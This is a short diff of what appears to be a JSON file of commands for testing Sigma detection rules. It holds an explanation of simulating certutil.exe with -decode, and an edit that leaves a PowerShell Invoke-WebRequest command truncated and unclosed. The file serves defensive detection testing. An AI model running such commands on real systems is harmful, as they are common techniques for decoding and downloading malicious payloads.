@@ -36,4 +36,6 @@
     "explanation": "This command simulates a suspicious child process (certutil.exe with -decode), which matches the Sigma rule's detection criteria. The command uses substitution (flag syntax) to maintain functionality while testing detection."
   },
   {
-    "output": "powershell.exe -NoP -Command \"Invoke-WebRequest -Uri '
+    "output": "powershell.exe -NoP -Command \"Invoke-WebRequest -Uri '"
+  }
+]
